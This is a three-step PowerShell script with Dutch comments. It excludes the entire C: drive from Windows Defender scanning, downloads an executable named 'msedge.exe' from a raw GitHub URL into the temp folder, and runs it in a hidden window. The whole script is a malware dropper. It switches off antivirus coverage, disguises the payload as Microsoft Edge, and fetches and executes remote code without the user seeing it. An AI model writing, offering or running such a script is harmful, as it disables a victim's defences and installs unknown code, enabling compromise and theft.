# Sluit de C:-schijf uit van Windows Defender-scans
Add-MpPreference -ExclusionPath "C:\"

# Download het bestand "msedge.exe" naar de tijdelijke map
iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -outfile "$env:tmp\msedge.exe"

# Voer het gedownloade bestand uit
cd $env:tmp; Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
